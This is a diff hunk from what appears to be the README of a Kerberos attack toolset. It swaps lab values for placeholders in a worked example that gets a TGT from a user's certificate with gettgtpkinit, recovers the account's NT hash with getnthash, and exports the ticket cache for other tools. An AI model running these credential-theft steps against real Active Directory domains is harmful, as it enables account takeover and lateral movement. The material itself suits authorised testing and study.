@@ -99,14 +99,14 @@ Obtain a service ticket impersonating another user using S4U2Self. Requires an a
 
 ```bash
 # Step 1: Get TGT with certificate
-$ ./gettgtpkinit -cert-pfx slacker.pfx -dc-ip 10.1.1.10 spinninglikea.top/slacker output.ccache
+$ ./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache
 AS-REP encryption key (you might need this later):
-95ba4cf1622f464d4fd5110797d24ea6c12dc0bea44eb19e9bb1242e4abb7207
+c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890
 Saved TGT to file
 
 # Step 2: Extract NT hash from the PKINIT TGT
-$ ./getnthash -ccache output.ccache -key 95ba4cf1622f464d4fd5110797d24ea6c12dc0bea44eb19e9bb1242e4abb7207 -dc-ip 10.1.1.10
-Recovered NT Hash: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
+$ ./getnthash -ccache output.ccache -key c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890 -dc-ip 10.0.0.1
+Recovered NT Hash: e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6
 
 # Step 3: Use TGT with other tools
 $ export KRB5CCNAME=output.ccache
